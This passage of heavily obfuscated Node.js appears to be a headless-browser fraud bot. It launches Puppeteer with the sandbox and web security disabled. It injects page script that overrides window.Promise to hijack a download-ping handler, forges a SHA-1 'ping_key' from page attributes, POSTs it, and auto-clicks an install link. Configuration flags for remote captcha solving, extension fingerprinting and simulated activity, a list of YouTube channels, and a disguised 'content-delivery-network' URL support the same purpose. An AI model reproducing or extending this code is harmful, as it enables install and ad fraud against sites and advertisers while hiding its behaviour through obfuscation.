-0x15f1) << y[-0x1010 + -0xfd * 0x11 + 0x20e * 0x10 & N++], P[N >> 0x153e + -0x2 * -0x11ea + -0x3910] |= (-0x1 * 0x21f3 + 0x1 * -0x1034 + 0x32a7 | -0x9f * -0x23 + 0x3 * -0x506 + -0x6 * 0x112 & L) << y[-0x21b9 * 0x1 + 0xe69 * -0x1 + 0x3025 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xe0 * -0x1d + -0x186 * -0x11 + -0x3306 ? (this['block'] = P[0x87b + 0x1692 + 0x1 * -0x1efd], this['start'] = N - (-0x1cba + 0x964 + 0x6d * 0x2e), this['hash'](), this['hashed'] = 0xb6c + -0x3 * 0x50b + 0x19 * 0x26) : this['start'] = N;
                }
                return this['bytes'] > 0x5519 * -0x2f91b + -0x103a30e07 + 0x300a358a9 && (this['hBytes'] += this['bytes'] / (-0xc4615efc + 0x6 * -0x37827246 + -0x1d05ea * -0x1b10) << 0x2422 + -0x11f9 * 0x1 + -0x1 * 0x1229, this['bytes'] = this['bytes'] % (0x230c39c0 + -0x10 * 0x8974fa5 + 0x3350dc * 0x6fc)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * -0x226 + -0xeda + 0xcb5;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x9cc + 0x13bb * 0x1 + -0x9df] = this['block'], J[K >> -0x489 + -0x13 + 0x49e] |= x[-0xb5 * -0x22 + -0x14 * -0x103 + -0x2c43 & K], this['block'] = J[0x4 * -0x115 + -0x121 * -0x1e + -0x1d7a], K >= -0x10 * 0x181 + 0x2188 + -0x40 * 0x25 && (this['hashed'] || this['hash'](), J[0xc7 * 0x2 + -0x303 + 0x175] = this['block'], J[-0x89 * 0x2c + -0x11 * -0x117 + -0x515 * -0x1] = J[-0x475 + -0x1c06 + -0x18c * -0x15] = J[-0x1d8f + -0x234e * -0x1 + -0x5bd * 0x1] = J[-0x3 * -0x2b9 + -0x820 + -0x8] = J[-0x329 * 0x4 + 0x1 * -0x32b + 0xfd3] = J[0x20b6 + -0x35 * 0x67 + 0x1e5 * -0x6] = J[0x1d89 + -0x1 * 0x1859 + -0x52a] = J[-0xe5 * 0x1 + -0x54b * 0x5 + 0x1b63] = J[0xa89 + -0x1eaf * -0x1 + -0x1498 * 0x2] = J[0x1809 + 0xf19 + -0x2719] = J[0xf11 * -0x1 + -0x2 * 0x9eb + 0x22f1] = J[0x7 * 0x5b + 0x76b * -0x4 + 0x1b3a] = J[0x143f + -0x2 * -0x12cc + 0x10d * -0x37] = J[0x28f * -0x5 + 0x20 + 0xcb8] = J[0xafa * -0x1 + -0x190b + 0x2413] = J[-0x5f * 0x29 + 0xd09 + 0x23d] = 0x1 * -0xf17 + -0x3 * 0x1d5 + -0x41e * -0x5), J[-0xb00 + -0x20a0 + 0x15d7 * 0x2] = this['hBytes'] << 0x11c9 + -0x6b * -0x16 + -0x4 * 0x6be | this['bytes'] >>> 0x1a3e * 0x1 + -0x1538 + -0x4e9, J[0x3 * 0x8d1 + 0x119b * 0x1 + -0x2bff] = this['bytes'] << -0x189 + -0x186f + 0x19fb, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x325 * 0x2 + 0x2597 + -0xe9b * 0x3; J < -0xb9 * -0x1f + 0xb0e * -0x1 + -0x1 * 0xb09; ++J)
                K = Q[J - (-0x128f * -0x1 + -0x13d + 0x7 * -0x279)] ^ Q[J - (-0x3 * 0x437 + -0x32c * -0x1 + 0x1 * 0x981)] ^ Q[J - (-0x11 * -0xe9 + 0x759 * -0x3 + 0x6a0)] ^ Q[J - (-0x649 * 0x5 + -0xb05 + 0x2a82)], Q[J] = K << 0x8e6 + 0x9b5 + -0x129a | K >>> 0x1 * 0x1431 + 0x96 * -0x2d + -0x1a * -0x3e;
              for (J = 0x664 * 0x1 + -0x1b77 + 0x53 * 0x41; J < -0x44b + -0x1 * -0x1153 + -0xcf4 * 0x1; J += -0x1a7f + 0x41c + 0x1de * 0xc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x8 * -0x49d + 0x19fb + -0x26b * 0x1a | L >>> -0x19a9 * -0x1 + 0x1023 + -0x29b1) + (M & N | ~M & O) + P + (-0x8765e6ee + 0x20d4434c + 0x43 * 0x2e1bba9) + Q[J] << -0x12b8 + -0x206a + -0x74e * -0x7) << -0x1 * 0x434 + 0x222b + 0xef9 * -0x2 | P >>> 0x1 * 0x28d + 0x59c + -0x80e) + (L & (M = M << 0x1 * 0xa + -0x2414 * 0x1 + 0x2428 | M >>> 0x10 * -0x1a5 + -0xe9 * 0x25 + 0x3bff * 0x1) | ~L & N) + O + (-0x4 * 0x1f9cee4b + -0x1ac11fd6 * -0x1 + -0xbe3512ef * -0x1) + Q[J + (0x5cb + -0x249f + 0x1 * 0x1ed5)] << -0x17fb + 0x3 * -0xa9e + 0x37d5) << 0x1f0b + -0x1a8a + -0x2 * 0x23e | O >>> 0xb5 + 0x20fb * -0x1 + -0x2061 * -0x1) + (P & (L = L << -0xcf5 + -0x25 * 0xa7 + -0x16 * -0x1b1 | L >>> 0x13e9 + 0x187 + -0x156e) | ~P & M) + N + (-0x320b39fd * -0x3 + 0x26ef0 * -0x261 + -0x35d54b6e) + Q[J + (-0xccd + -0x23c3 + 0x3092)] << 0x28 * -0xf8 + -0x1b5a + 0x421a) << 0x17 * 0x13b + -0x2 * -0x44b + 0x21 * -0x11e | N >>> -0x4b1 * 0x1 + 0xf40 * 0x2 + -0x19b4) + (O & (P = P << -0xbe2 * -0x3 + -0x59 * 0x4b + -0x975 | P >>> -0x1032 * -0x2 + 0x319 + -0x237b) | ~O & L) + M + (0xa * -0xd93c943 + 0x5 * 0x16567a99 + 0x7297f13a) + Q[J + (-0x1ddc + 0x3 * -0x989 + 0x3a7a)] << -0x1 * -0x3ef + -0x1973 + 0x1584) << -0x1ca + -0x1 * -0x2319 + -0x214a | M >>> 0x1594 + 0xa3 * -0x20 + -0x1 * 0x119) + (N & (O = O << 0x3b * 0x81 + 0x1b80 + 0x391d * -0x1 | O >>> 0x1598 + -0x2 * 0x11af + 0xdc8) | ~N & P) + L + (-0x29250c09 + -0x1 * -0x56c2155b + -0x5f54f * -0x789) + Q[J + (0x92b + 0x1 * -0x98c + 0x65)] << -0x23c8 + -0x1 * -0x1ed7 + 0x4f1, N = N << -0xc6e + -0x45 * 0x67 + -0x1 * -0x284f | N >>> -0x6dd + -0xf87 + 0x1666;
              for (; J < -0x1ad7 + 0x9 * -0x2b3 + 0x334a; J += 0x1ecd + 0x94f * 0x1 + -0x137 * 0x21)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1ca0 * 0x1 + -0x12d5 * -0x1 + -0x2f70 | L >>> -0x51 * -0x61 + 0x5 * -0x763 + 0x659) + (M ^ N ^ O) + P + (0x48dd * 0xb96c + 0x2364179a + 0x16af61cb) + Q[J] << -0x13 * -0x1c6 + -0x83e + -0xcba * 0x2) << 0xa2 * -0x23 + -0x22 * 0x107 + 0x1 * 0x3919 | P >>> 0xa6f + -0x17 * 0x5c + -0xb * 0x30) + (L ^ (M = M << -0x1961 + 0xb5a + -0x11 * -0xd5 | M >>> -0xcee * -0x3 + 0xeb0 + -0x3578) ^ N) + O + (-0x53 * 0xfa07d6 + -0x61 * -0xf16b47 + 0x2 * 0x3238680e) + Q[J + (-0x2417 * 0x1 + -0x255c + 0x4974)] << -0x77c + -0xbad + 0x1329) << -0x3 * 0x5bf + -0x14f5 + 0x2637 | O >>> 0x1277 * -0x1 + -0x96a + -0x1bfc * -0x1) + (P ^ (L = L << -0x3 * 0x461 + 0x948 + 0x3f9 | L >>> 0x1 * -0xa27 + 0x4e3 * 0x1 + 0x546 * 0x1) ^ M) + N + (-0x2322c5bb + 0x2 * -0x1c5127af + -0x654f805d * -0x2) + Q[J + (-0x1eda + 0x24ef + -0x613)] << -0x18d * 0x15 + -0x1 * -0x1dbb + 0x2d6 * 0x1) << -0x1b5 + 0x4 * -0x18a + -0x1 * -0x7e2 | N >>> -0x1846 + 0x134e + 0x513) + (O ^ (P = P << 0x1 * -0x5fb + -0xd78 + -0x1 * -0x1391 | P >>> 0xa8b + 0x187 * -0x9 + 0x336) ^ L) + M + (0x54a5f0 * 0x236 + 0x8a8ad359 + 0x3 * -0x479d42c8) + Q[J + (-0x26dd + -0x1341 + 0x3a21 * 0x1)] << -0x1049 + -0x903 + 0x194c) << 0x25b7 + -0x4d * -0x61 + -0x42df | M >>> 0x2 * 0x2f3 + -0xe3 * 0x3 + -0x322) + (N ^ (O = O << 0x8 * -0x4ac + 0x2403 + 0x17b | O >>> -0x1b * -0xf9 + 0x1808 + -0x15 * 0x265) ^ P) + L + (-0x69500ebd + 0x8c40bd01 + 0x4be93d5d) + Q[J + (0x1 * -0xa53 + 0x1 * -0x13a4 + -0x1 * -0x1dfb)] << 0x1f5f + 0x2a * 0xa9 + 0x3 * -0x13b3, N = N << 0xfcf + 0x2bd * -0xd + 0x13e8 | N >>> 0x1 * -0x191c + -0x1 * -0xaa7 + 0xe77;
              for (; J < -0x33b + -0x2 * -0x993 + -0xfaf; J += -0x14 * 0x18a + -0x2251 + 0x411e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x1eb2 + 0x29 * -0xd + 0x20cc | L >>> 0x1bc3 + 0x15 * -0x79 + -0x11bb) + (M & N | M & O | N & O) + P - (-0x1f * -0x29fe863 + 0x624b * 0x1645f + -0x694da6ae) + Q[J] << -0x189a * -0x1 + -0xac1 + 0x2c5 * -0x5) << 0x1 * -0x2132 + -0x1132 + -0x91 * -0x59 | P >>> 0x2222 + 0xc3e + -0x203 * 0x17) + (L & (M = M << -0x1 * 0x1837 + 0x1 * -0x2524 + 0x3d79 | M >>> -0x163a + -0x166 * -0x5 + 0xf3e) | L & N | M & N) + O - (0x9ec51e27 + 0x615e4f96 + 0x8f3f2a99 * -0x1) + Q[J + (0x26e5 + -0x1 * -0x1764 + -0x2 * 0x1f24)] << -0xe21 + 0x1869 * 0x1 + -0xe * 0xbc) << -0x2509 + -0x998 + 0x2ea6 | O >>> -0x67 * -0x2c + 0x3 * -0x1cd + 0xdf * -0xe) + (P & (L = L << -0x7d2 + 0xb * -0x283 + 0x2391 | L >>> 0x1083 + 0x185 + -0x1206) | P & M | L & M) + N - (-0x246d9e14 + 0xa50f2b04 + -0x2c4724 * 0x5b) + Q[J + (0x3 * 0xca6 + -0x205 + -0x265 * 0xf)] << 0x120 + -0x45 * 0x3d + 0xf51) << -0x12d * 0x9 + -0x2 * 0xb8c + 0x21b2 | N >>> -0x26b2 + 0x1fe0 + 0x6ed) + (O & (P = P << -0x21b0 + 0x22d * 0x4 + 0x191a | P >>> 0x2706 + -0x2522 + -0x2 * 0xf1) | O & L | P & L) + M - (-0x3bebb035 + 0x7eb123b9 + 0x1bd8a4 * 0x1a8) + Q[J + (0x1b2b + -0x1 * 0x5e8 + -0x1 * 0x1540)] << -0x65b + 0x1a87 * -0x1 + -0xaf6 * -0x3) << -0x3 * -0xb1 + -0x1 * -0xe75 + 0x1 * -0x1083 | M >>> -0x1855 * 0x1 + -0x2 * -0x40f + 0x1052) + (N & (O = O << -0x227c + -0x1c68 * 0x1 + 0x3f02 | O >>> -0x38 * -0x17 + 0x31a + -0x820) | N & P | O & P) + L - (0x5502b520 + 0x34 * 0x1893c3 + -0x2dc714d * -0x8) + Q[J + (-0x2aa * -0x7 + 0x2618 + 0x2 * -0x1c5d)] << -0x1 * -0x5bc + 0x1a * 0x86 + -0x1358, N = N << 0x274 * -0xf + 0x224f * 0x1 + 0x29b | N >>> 0x62b * -0x5 + -0x1ca + 0x20a3;
              for (; J < 0x1d83 + 0x11 * 0x151 + 0x1 * -0x3394; J += 0x262e + 0x7 * 0x47e + 0xad * -0x67)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x44 * -0x22 + 0x17 * -0x21 + 0xc04 | L >>> -0x2655 + -0x7d + -0x1 * -0x26ed) + (M ^ N ^ O) + P - (0xebb67a8 + -0xfd54381 + -0x1 * -0x36b71a03) + Q[J] << -0xd96 + -0x3 * 0xee + 0x1060) << -0x4b6 + 0x1e * 0x49 + -0x3d3 | P >>> -0x76f * -0x1 + 0xc9 * -0x1f + -0x1 * -0x1103) + (L ^ (M = M << 0x4 * 0x16b + -0x53 * 0x1d + 0x3d9 | M >>> 0x121 * 0x1 + 0x6ab + -0x7ca) ^ N) + O - (-0xb30ff9d + -0x5c81ddb6 + 0x9d501b7d) + Q[J + (0x16c7 + 0x84 * 0x4a + -0x3cee)] << 0x1b7d * 0x1 + 0x11a8 + -0x7f * 0x5b) << -0x17ff + 0x2494 + -0xc90 | O >>> -0x4a1 * -0x5 + 0x2 * -0xc83 + 0x2 * 0xfe) + (P ^ (L = L << -0x1 * -0x73d + -0x1f9d + 0x187e | L >>> -0x267 * 0x1 + -0x1555 + 0x17be) ^ M) + N - (0x700fc6 * -0x43 + 0x5bd40468 + -0x9 * 0xfcbd0c) + Q[J + (-0x2cf + 0x1980 * 0x1 + -0x16af * 0x1)] << -0x6f3 * 0x1 + 0x15d4 + -0xee1) << 0x17cb * 0x1 + -0x25e6 + 0x710 * 0x2 | N >>> -0x26e6 * 0x1 + 0x9ba * -0x1 + -0x1 * -0x30bb) + (O ^ (P = P << 0x181 * -0x19 + 0x1464 + 0x5 * 0x377 | P >>> -0x3 * 0x26b + -0x1a7 + -0x7 * -0x146) ^ L) + M - (-0x6a04543 + 0xaa * 0x3f1f77 + -0x29e16a1 * -0x7) + Q[J + (-0x8d2 * 0x1 + -0x3 * 0xb5a + 0x2ae3)] << 0x1409 + -0x1 * 0x1c5b + -0x1 * -0x852) << -0x1 * -0x572 + -0xfca + 0x17b * 0x7 | M >>> -0xf5a + -0x1e1 + 0x7 * 0x27a) + (N ^ (O = O << 0x1 * -0x23d5 + -0x6f7 + -0x3 * -0xe4e | O >>> -0x1168 + 0x1c23 + -0xab9) ^ P) + L - (0x343d2a36 + 0x1 * -0x550cb44d + 0x566cc841) + Q[J + (0x7 * 0x1c3 + -0x1f10 + -0x12bf * -0x1)] << -0xf63 + -0x3 * -0x13f + 0xba6, N = N << 0x30c + 0x22de + -0x25cc * 0x1 | N >>> 0x25 * 0xa4 + 0x7aa + 0x1 * -0x1f5c;
              this['h0'] = this['h0'] + L << -0xdbc + 0x1d2f + -0x1 * 0xf73, this['h1'] = this['h1'] + M << -0x58 * 0x49 + -0x1 * -0x21fb + -0x8e3, this['h2'] = this['h2'] + N << 0x1d0f + 0xa3 * -0x25 + -0x580, this['h3'] = this['h3'] + O << 0x3 * -0xb47 + -0x2 * -0x12a3 + -0x371 * 0x1, this['h4'] = this['h4'] + P << -0x975 + -0x1 * 0xd7b + 0x16f0;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1 * 0xda + -0xa * 0x23b + 0x1744 * 0x1 & 0x2383 + -0x12ec + -0x1088] + w[J >> 0x1440 + 0x1511 + -0x2939 & -0xd70 + -0x9c6 + -0x1 * -0x1745] + w[J >> -0x2149 + 0xb0a + 0x1653 & -0x1f9a + 0x1 * -0xe3e + 0x2de7 * 0x1] + w[J >> 0x26bf + 0x2516 * 0x1 + -0x4bc5 & -0x1cb2 + 0x1 * -0x18a3 + -0x4 * -0xd59] + w[J >> -0x224 * 0x2 + -0x121e + 0x1672 & -0x1 * -0x9e3 + 0x1a35 * 0x1 + -0x2409] + w[J >> 0x1 * -0x56 + 0x5e * -0x64 + 0x2516 & -0xa7 * -0x6 + 0xeb0 + -0x128b] + w[J >> 0x137d + -0x1 * 0x233 + -0x43 * 0x42 & -0x1001 + -0xb * -0x39 + 0xd9d] + w[0x1786 + 0x234d * 0x1 + -0x3ac4 & J] + w[K >> -0x335 + -0x8 * 0x36a + 0x1ea1 & 0x1 * 0x1496 + -0x1fac + -0xb25 * -0x1] + w[K >> 0x146b + 0x741 * 0x1 + -0x1b94 & -0x412 + 0x1 * -0xed1 + 0x12f2] + w[K >> 0x17 * -0xdf + -0xc * -0x213 + 0x4c7 * -0x1 & -0x170d + 0x26ce * 0x1 + -0x29 * 0x62] + w[K >> -0x43 * -0x5f + 0x1275 + -0x317 * 0xe & -0x7cf * -0x3 + 0x64 * 0x9 + -0x1ae2] + w[K >> -0x1e5c + -0x1b00 + -0x1cb4 * -0x2 & -0x1d0e + -0x2c * -0xd + 0x3d7 * 0x7] + w[K >> 0x1f11 + -0x270 + -0x1 * 0x1c99 & -0x9 * 0x164 + 0x20a0 + -0x6af * 0x3] + w[K >> 0x490 + 0x247 * 0x3 + -0xb61 & 0x1979 + 0x1017 + 0x19 * -0x1a9] + w[0x4c * 0x4f + -0x255c + 0xdf7 & K] + w[L >> -0x1fa7 * -0x1 + -0x1af6 * 0x1 + -0x495 & -0x1 * 0x136e + -0x7 * 0x49d + 0x33c8] + w[L >> 0x1d6d + 0x19e7 + 0x7e4 * -0x7 & 0x51a + 0xd76 + -0x1281] + w[L >> 0x1c * 0x47 + -0x1817 + -0x13 * -0xdd & 0x2 * -0x1c2 + 0x1151 + -0xdbe] + w[L >> -0xb * 0x2dd + -0x1756 + 0x36e5 & -0x1 * -0x26c3 + 0xe0b + -0x34bf] + w[L >> -0xa5 + 0x13d4 + -0x1323 & 0x6a6 + -0x8a2 + 0x1 * 0x20b] + w[L >> 0x1 * -0xae4 + 0x6b * 0x26 + -0x4f6 & -0x1741 + -0x1701 + 0x1 * 0x2e51] + w[L >> 0x1 * 0x115a + -0x171f + 0x5c9 & -0x4e9 + 0x3d * 0x2b + -0x547] + w[0x1 * 0x427 + 0x4 * -0x70c + 0x4 * 0x606 & L] + w[M >> -0xba5 + 0xf8b + 0xa * -0x61 & 0x2c * 0xb3 + 0x1537 * 0x1 + -0x1 * 0x33ec] + w[M >> -0xf1b + -0x35f * -0x5 + -0x1a8 & -0x753 * -0x1 + -0x38c * 0xb + 0x2 * 0xfe0] + w[M >> 0xc22 * -0x2 + 0x1f52 + -0x2 * 0x37d & -0x38f * -0x7 + -0x4a7 + -0x1433] + w[M >> 0x1936 + 0x18ce + -0x31f4 & 0xa24 + 0x1e * -0xe + -0x871] + w[M >> 0x11d + 0x1a27 + -0x2 * 0xd9c & 0x2538 + -0x2 * 0xf73 + 0x1 * -0x643] + w[M >> 0x1 * -0x72e + 0x5a4 + 0x192 & -0x22 * -0x3e + -0x3a * 0x62 + 0xe07] + w[M >> 0x9f5 + -0xe * 0x84 + 0x2b9 * -0x1 & -0x1524 + -0x10f * -0xb + -0x4c7 * -0x2] + w[-0x1fac + 0x1 * -0x4d5 + 0x41 * 0x90 & M] + w[N >> -0x2 * -0x65d + -0xb * 0x29e + -0x6 * -0x2b2 & -0x1db9 + 0x1c1f + 0x1a9] + w[N >> -0x1d * 0x7d + -0x1e47 + 0x2c88 & -0x9cd + 0x20d6 + -0x16fa] + w[N >> -0x1798 + -0xd2d + 0x24d9 & -0x231a + 0xec + 0x223d] + w[N >> 0xc7c + -0x45 * -0x8a + -0x319e & -0x1 * 0x1cdb + -0x1d39 * 0x1 + -0x29 * -0x16b] + w[N >> 0x66c + -0x389 * -0x6 + -0x1b96 & 0x11 * 0x15b + -0x2499 + 0xcd * 0x11] + w[N >> 0x12ba + -0x1daa + 0x3 * 0x3a8 & -0x803 * 0x3 + 0x707 * -0x1 + 0x1f1f] + w[N >> 0x2 * -0x2ed + 0x15 * 0xa6 + 0x3e0 * -0x2 & 0x191b + 0x24c0 + -0x3dcc] + w[0x3 * 0x4cd + 0x5 * -0x736 + 0x1 * 0x15b6 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x557 * -0x7 + 0x21f * 0x2 + 0x213b & 0x5 * 0x2cb + -0x6 * -0x5 + -0xd16,
                J >> -0xca4 * 0x1 + 0xe3e + -0x18a * 0x1 & 0x1f * -0xa7 + 0x3 * -0x9fe + 0x1999 * 0x2,
                J >> -0xb6 + -0x2 * -0x4df + 0x18 * -0x60 & -0x1 * -0x120f + -0x1b9f * 0x1 + 0xa8f,
                0xaca + -0x1838 + -0x1 * -0xe6d & J,
                K >> -0x31 + -0x12f * 0x7 + 0x1 * 0x892 & 0x2 * 0xb12 + -0x13 * -0xb8 + 0x1 * -0x22cd,
                K >> -0x62b * -0x1 + -0xe3 * -0x29 + -0x1 * 0x2a76 & -0x1a6f + 0x2b9 + 0x73 * 0x37,
                K >> 0x1de * -0x8 + -0x71 * -0x40 + -0xd48 & -0x27 * -0x2 + -0x6ef * 0x1 + 0x7a0,
                0x83 * -0x45 + -0x35 * -0x74 + 0xc4a & K,
                L >> 0x22 * -0x17 + 0x75d + -0x437 & -0xb28 + -0x21 * -0x65 + 0x6 * -0x25,
                L >> 0x50b + 0x1cbc + -0x21b7 & 0x131 + -0x2388 + -0x2 * -0x11ab,
                L >> 0x3 * -0xc7a + -0x867 + 0x3b * 0xc7 & -0x9ae + 0x67 * -0x47 + 0x139f * 0x2,
                0xaee * -0x1 + 0x3 * -0xb + 0x1 * 0xc0e & L,
                M >> 0x5dd + -0xc27 + 0x662 & 0x5be + -0x12b1 + 0xdf2,
                M >> 0x1a73 + 0x15db + -0x303e & -0x1 * 0x10e3 + -0x3 * 0xab7 + 0x3207 * 0x1,
                M >> -0x1084 + 0x2056 * 0x1 + 0x2f * -0x56 & -0xea0 + -0x4d * 0x19 + -0xb92 * -0x2,
                0x1d3b + -0x2 * -0x14c + -0x1 * 0x1ed4 & M,
                N >> -0x1642 + -0x113 * 0xc + 0x2b6 * 0xd & 0x26b6 + 0x4 * -0x5a5 + -0x19 * 0x9b,
                N >> -0x1038 + 0xc97 + 0x1b * 0x23 & -0x19 * 0xb1 + 0x6ef + 0xb59,
                N >> 0x2630 + 0x705 * -0x1 + 0x1f23 * -0x1 & 0x381 * -0xa + 0x18dc + 0xb2d,
                0x24f3 + 0xdd3 + -0x31c7 * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * -0x563 + 0x1061 * 0x1 + 0x15b0 * -0x1), (K = new DataView(J))['setUint32'](0xe01 + 0x19 * 0x7f + -0x1a68, this['h0']), K['setUint32'](0x1de0 + 0x7 * -0x61 + -0x1b35, this['h1']), K['setUint32'](-0x985 + -0x58f * -0x1 + 0x3fe, this['h2']), K['setUint32'](-0x1a07 + 0x1 * 0x2267 + 0x34 * -0x29, this['h3']), K['setUint32'](0x54 * -0x77 + 0x3 * 0x76a + -0x86f * -0x2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me'](T(0x14) + 'nk')[0x58 * 0x50 + 0x3a * 0x47 + -0x2b96];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            const U = b;
            let K = -0x761 + -0x17f5 + 0x1f56;
            J[0x143b + 0x2c1 + 0x16fc * -0x1]['toString']()['includes'](U(0x3, 'L1sz') + 'te(\x22data-p' + 'ing-url') && (J[0x5c * -0x54 + 0x1 * -0x65 + 0x1 * 0x1e95] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x268d * 0x1 + -0x2 * 0x515 + -0x1c62), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x112b + -0x1d9f + -0x441 * -0xb;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x224a + -0x1d * -0x61 + -0x1d29 * -0x1), Promise['resolve'](-0x1 * 0x3fe + -0x1f1e + 0x231d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * -0x647 + 0x151e + -0x1b65; j < 0x1 * 0x527 + -0x12c7 + 0xda1; j++)
    i();
}

function a() {
  const bk = [
    '6z2I55M944gelgnJDhyGyG',
    'leqKf8oBiLGupdm',
    'BYbNyw1LCgXHEq',
    'krdcLCoLESk0WRBcHZVcLa',
    'WQFcV8oiggRcQuxcJJb5',
    'cors',
    'WQdcKNhcVZVdNmoGWPpcMXq',
    'y3jLyxrLsgfZAa',
    'W7q7oCkbzh3cG8kgl8o7',
    'ger-js-6cf',
    'rCk+gSklWR7dM8kOW77dHSoP',
    'CMSUz2XPDgnOlG',
    'W5/dJJ3dG1TVhc/cMw4',
    'v52PClvMFt',
    't-button-s',
    'https://da',
    'qgBdQ8o0qbPCqGrc',
    'Kit/537.36',
    'WQK/W5JcNCofWP3dGYpcSwK',
    '>\x20div\x20>\x20di',
    'install-li',
    'zxjdB250zxH0',
    'kYRdUYa5WQm2W5r0W4G'
  ];
  a = function() {
    return bk;
  };
  return a();
}
const NETWORK_PATIENCE = -0x35 * -0x103 + -0x3d79 * -0x1 + -0x8 * 0xa7b + (0x2216 + -0x376 + -0x12e8) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1513 + 0x1 * -0x1024 + -0xa * -0x3b9) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + V(0xb) + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x103f + 0x2274 + 0x3b * -0x4f; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
